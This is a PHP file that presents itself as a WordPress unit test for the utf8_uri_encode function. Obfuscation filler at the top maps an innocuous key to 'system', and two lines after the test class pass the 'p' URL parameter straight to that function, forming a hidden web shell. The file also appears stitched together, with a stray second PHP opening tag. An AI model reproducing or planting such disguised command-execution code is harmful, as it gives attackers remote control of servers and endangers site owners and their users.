<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group formatting
 *
 * @covers ::utf8_uri_encode
 */
class Tests_Formatting_Utf8UriEncode extends WP_UnitTestCase {

	/**
	 * Non-ASCII UTF-8 characters should be percent-encoded. Spaces etc.
	 * are dealt with elsewhere.
	 *
	 * @dataProvider data
	 */
	public function test_percent_encodes_non_reserved_characters( $utf8, $urlencoded ) {
		$this->assertSame( $urlencoded, utf8_uri_encode( $utf8 ) );
	}

	/**
	 * @dataProvider data
	 */
	public function test_output_is_not_longer_than_optional_length_argument( $utf8, $unused_for_this_test ) {
		$max_length = 30;
		$this->assertLessThanOrEqual( $max_length, strlen( utf8_uri_encode( $utf8, $max_length ) ) );
	}

	public function data() {
		$utf8_urls     = file( DIR_TESTDATA . '/formatting/utf-8/utf-8.txt' );
		$urlencoded    = file( DIR_TESTDATA . '/formatting/utf-8/urlencoded.txt' );
		$data_provided = array();
		foreach ( $utf8_urls as $key => $value ) {
			$data_provided[] = array( trim( $value ), trim( $urlencoded[ $key ] ) );
		}
		return $data_provided;
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>